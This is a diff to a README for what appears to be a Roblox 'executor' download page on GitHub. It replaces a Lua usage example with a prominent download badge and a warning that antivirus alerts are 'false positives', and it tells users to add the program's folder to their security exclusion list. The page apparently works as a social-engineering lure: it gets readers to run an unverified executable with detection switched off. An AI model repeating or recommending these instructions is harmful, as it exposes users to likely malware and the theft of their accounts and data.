@@ -10,8 +10,9 @@
 </p>
 
 <p align="center">
-  <a href="https://github.com/wellmagistratesense/Roblox-Collection-Executor-PC-Version/releases/tag/luna-download">
-    <img src="https://i.ibb.co/v4b9FPy/download-green.png" alt="Download" width="380">
+  <a href="https://github.com/wellmagistratesense/Roblox-Collection-Executor-PC-Version/releases/tag/luna-download" target="_blank">
+    <img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/gradient.png" width="100%" height="6px" /></br>
+    <img src="https://img.shields.io/badge/DOWNLOAD-LUNA%20EXECUTOR-brightgreen?style=for-the-badge&logo=windows&logoColor=white" height="45" />
   </a>
 </p>
 
@@ -29,10 +30,8 @@
 3. Extract the contents to a secure folder on your local drive.
 4. Launch the main executable and follow the on-screen configuration wizard.
 
-## 📝 Usage Example
-Load your custom code into the editor workspace and press the execution button:
-```lua
--- Example: Testing environment functionality
-print("Luna environment loaded successfully!")
-local workspace = game:GetService("Workspace")
-print("Target instance: " .. tostring(workspace))
+## 🔒 Security & False Positives
+> [!WARNING]
+> Due to the nature of compilation and memory-linking techniques used by execution software, some security suites or windows protection systems might flag the application as a "False Positive". 
+> 
+> If this occurs, you may need to add the application directory to your security software's exclusion list.
